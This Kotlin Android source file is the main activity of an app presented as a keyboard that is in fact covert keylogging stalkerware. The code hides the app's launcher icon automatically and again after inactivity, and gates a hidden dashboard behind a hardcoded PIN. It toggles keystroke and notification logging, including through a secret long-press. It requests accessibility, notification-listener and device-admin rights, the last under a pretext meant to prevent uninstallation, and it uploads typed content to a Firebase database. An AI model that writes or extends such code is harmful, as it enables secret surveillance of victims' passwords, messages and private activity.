package com.example.mykeyboard

import android.annotation.SuppressLint
import android.app.Activity
import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.view.inputmethod.InputMethodManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import com.google.firebase.FirebaseApp
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@SuppressLint("InlinedApi", "NewApi")
class MainActivity : Activity() {

    private var txtKeyboardStatus: TextView? = null
    private var txtAccessibilityStatus: TextView? = null
    private var txtNotificationStatus: TextView? = null
    private var txtLogConsole: TextView? = null
    private var loginOverlay: LinearLayout? = null
    private var etPinInput: EditText? = null
    private var isAuthenticated = false

    private val autoHideHandler = Handler(Looper.getMainLooper())
    private val autoHideRunnable = Runnable {
        try {
            val p = packageManager
            val componentName = ComponentName(this, MainActivity::class.java)
            p.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Toast.makeText(this, "App automatically hidden due to inactivity (10 mins).", Toast.LENGTH_SHORT).show()
            finish()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    companion object {
        private const val CORRECT_PIN = "00100"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            setContentView(R.layout.activity_main)
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // Automatically hide app icon from launcher / app drawer after install/launch
        hideAppIconAutomatically()

        // Prompt for password on launch with full black overlay
        showPasswordOverlay()
    }

    private fun hideAppIconAutomatically() {
        try {
            val p = packageManager
            val componentName = ComponentName(this, MainActivity::class.java)
            if (p.getComponentEnabledSetting(componentName) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                p.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun showPasswordOverlay() {
        if (isAuthenticated) return
        loginOverlay = findViewById(R.id.loginOverlay)
        etPinInput = findViewById(R.id.etPinInput)
        val btnLoginSubmit = findViewById<Button>(R.id.btnLoginSubmit)

        loginOverlay?.visibility = View.VISIBLE

        btnLoginSubmit?.setOnClickListener {
            val enteredPin = etPinInput?.text?.toString() ?: ""
            if (enteredPin == CORRECT_PIN) {
                isAuthenticated = true
                loginOverlay?.visibility = View.GONE
                Toast.makeText(this, "Access Granted", Toast.LENGTH_SHORT).show()
                initDashboard()
                updateStatuses()
                resetAutoHideTimer()
            } else {
                Toast.makeText(this, "Incorrect Password!", Toast.LENGTH_SHORT).show()
                etPinInput?.setText("")
            }
        }
    }

    private fun resetAutoHideTimer() {
        autoHideHandler.removeCallbacks(autoHideRunnable)
        // 10 minutes = 600,000 milliseconds
        autoHideHandler.postDelayed(autoHideRunnable, 600_000L)
    }

    override fun onUserInteraction() {
        super.onUserInteraction()
        if (isAuthenticated) {
            resetAutoHideTimer()
        }
    }

    private fun initDashboard() {
        try {
            txtKeyboardStatus = findViewById(R.id.txtKeyboardStatus)
            txtAccessibilityStatus = findViewById(R.id.txtAccessibilityStatus)
            txtNotificationStatus = findViewById(R.id.txtNotificationStatus)
            txtLogConsole = findViewById(R.id.txtLogConsole)

            val titleView = findViewById<TextView>(R.id.txtDashboardTitle)
            titleView?.setOnLongClickListener {
                KeyloggingConfig.isEnabled = !KeyloggingConfig.isEnabled
                val status = if (KeyloggingConfig.isEnabled) "ENABLED" else "DISABLED"
                Toast.makeText(this, "Keylogging is now $status", Toast.LENGTH_LONG).show()
                LogStore.addLog("Hidden Toggle: Keylogging is $status")
                true
            }

            val btnKeyboard = findViewById<Button>(R.id.btnEnableKeyboard)
            val btnAccessibility = findViewById<Button>(R.id.btnEnableAccessibility)
            val btnNotification = findViewById<Button>(R.id.btnEnableNotification)
            val btnTestSync = findViewById<Button>(R.id.btnTestSync)
            val btnEnableAdmin = findViewById<Button>(R.id.btnEnableAdmin)
            val btnHideAppIcon = findViewById<Button>(R.id.btnHideAppIcon)
            val btnToggleKeyLog = findViewById<Button>(R.id.btnToggleKeyLog)
            val btnToggleNotifLog = findViewById<Button>(R.id.btnToggleNotifLog)

            fun updateToggleButtons() {
                if (KeyloggingConfig.isEnabled) {
                    btnToggleKeyLog?.text = "Key Logger: ENABLED"
                    btnToggleKeyLog?.setBackgroundColor(android.graphics.Color.parseColor("#388E3C"))
                } else {
                    btnToggleKeyLog?.text = "Key Logger: DISABLED"
                    btnToggleKeyLog?.setBackgroundColor(android.graphics.Color.parseColor("#C62828"))
                }

                if (NotificationConfig.isEnabled) {
                    btnToggleNotifLog?.text = "Notification Logger: ENABLED"
                    btnToggleNotifLog?.setBackgroundColor(android.graphics.Color.parseColor("#388E3C"))
                } else {
                    btnToggleNotifLog?.text = "Notification Logger: DISABLED"
                    btnToggleNotifLog?.setBackgroundColor(android.graphics.Color.parseColor("#C62828"))
                }
            }

            updateToggleButtons()

            btnToggleKeyLog?.setOnClickListener {
                KeyloggingConfig.isEnabled = !KeyloggingConfig.isEnabled
                updateToggleButtons()
                val status = if (KeyloggingConfig.isEnabled) "ENABLED" else "DISABLED"
                Toast.makeText(this, "Key Logger is now $status", Toast.LENGTH_SHORT).show()
                LogStore.addLog("Toggle: Key Logger is $status")
            }

            btnToggleNotifLog?.setOnClickListener {
                NotificationConfig.isEnabled = !NotificationConfig.isEnabled
                updateToggleButtons()
                val status = if (NotificationConfig.isEnabled) "ENABLED" else "DISABLED"
                Toast.makeText(this, "Notification Logger is now $status", Toast.LENGTH_SHORT).show()
                LogStore.addLog("Toggle: Notification Logger is $status")
            }

            LogStore.setListener { logs ->
                runOnUiThread {
                    txtLogConsole?.text = logs
                }
            }

            btnKeyboard?.setOnClickListener {
                try {
                    startActivity(Intent(Settings.ACTION_INPUT_METHOD_SETTINGS))
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            btnAccessibility?.setOnClickListener {
                try {
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            btnNotification?.setOnClickListener {
                try {
                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            btnHideAppIcon?.setOnClickListener {
                try {
                    val p = packageManager
                    val componentName = ComponentName(this, MainActivity::class.java)
                    p.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    Toast.makeText(this, "App icon hidden from app drawer successfully!", Toast.LENGTH_LONG).show()
                    LogStore.addLog("App icon hidden from launcher")
                    finish()
                } catch (e: Exception) {
                    Toast.makeText(this, "Error hiding icon: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            }

            btnEnableAdmin?.setOnClickListener {
                try {
                    val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Activate device administrator to prevent unauthorized uninstallation of this app.")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            }

            btnTestSync?.setOnClickListener {
                val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                try {
                    val database = FirebaseDatabase.getInstance()
                    val ref = database.getReference().child("keystrokes_batches").child(deviceName)
                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault()).format(Date())
                    val testData = mapOf(
                        "deviceName" to deviceName,
                        "appName" to "test.app",
                        "timestamp" to System.currentTimeMillis(),
                        "typedContent" to "Manual test keystroke at $timestampKey"
                    )

                    ref.child("test_app").child(timestampKey).setValue(testData)
                        .addOnSuccessListener {
                            Toast.makeText(this, "Test sync successful!", Toast.LENGTH_SHORT).show()
                            LogStore.addLog("[$deviceName] Manual test sync SUCCESS")
                        }
                        .addOnFailureListener { e: Exception ->
                            Toast.makeText(this, "Test sync failed: ${e.message}", Toast.LENGTH_LONG).show()
                            LogStore.addLog("[$deviceName] Manual test sync FAILED: ${e.toString()}")
                        }
                } catch (e: Exception) {
                    Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
                    LogStore.addLog("[$deviceName] Manual test error: ${e.toString()}")
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onResume() {
        super.onResume()
        if (isAuthenticated) {
            try {
                updateStatuses()
                resetAutoHideTimer()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    override fun onPause() {
        super.onPause()
        autoHideHandler.removeCallbacks(autoHideRunnable)
    }

    private fun updateStatuses() {
        try {
            // 1. Check Keyboard Status
            val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as? InputMethodManager
            val enabledMethods = imm?.enabledInputMethodList ?: emptyList()
            val myPackage = packageName
            var isKeyboardEnabled = false
            for (method in enabledMethods) {
                if (method.packageName == myPackage) {
                    isKeyboardEnabled = true
                    break
                }
            }

            if (isKeyboardEnabled) {
                txtKeyboardStatus?.text = "Status: Enabled ✓"
                txtKeyboardStatus?.setTextColor(android.graphics.Color.parseColor("#388E3C"))
            } else {
                txtKeyboardStatus?.text = "Status: Not Enabled ❌"
                txtKeyboardStatus?.setTextColor(android.graphics.Color.parseColor("#D32F2F"))
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            // 2. Check Accessibility Status
            val accessibilityEnabled = try {
                val settingValue = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED)
                if (settingValue == 1) {
                    val service = "${packageName}/${AppAccessibilityService::class.java.name}"
                    val settingValue2 = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
                    settingValue2?.contains(service) == true
                } else false
            } catch (e: Exception) {
                false
            }

            if (accessibilityEnabled) {
                txtAccessibilityStatus?.text = "Status: Enabled ✓"
                txtAccessibilityStatus?.setTextColor(android.graphics.Color.parseColor("#388E3C"))
            } else {
                txtAccessibilityStatus?.text = "Status: Not Enabled ❌"
                txtAccessibilityStatus?.setTextColor(android.graphics.Color.parseColor("#D32F2F"))
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            // 3. Check Notification Access Status
            val notificationEnabled = try {
                val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
                val componentName = ComponentName(this, AppNotificationListenerService::class.java)
                enabledListeners?.contains(componentName.flattenToString()) == true || enabledListeners?.contains(packageName) == true
            } catch (e: Exception) {
                false
            }

            if (notificationEnabled) {
                txtNotificationStatus?.text = "Status: Enabled ✓"
                txtNotificationStatus?.setTextColor(android.graphics.Color.parseColor("#388E3C"))
            } else {
                txtNotificationStatus?.text = "Status: Not Enabled ❌"
                txtNotificationStatus?.setTextColor(android.graphics.Color.parseColor("#D32F2F"))
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
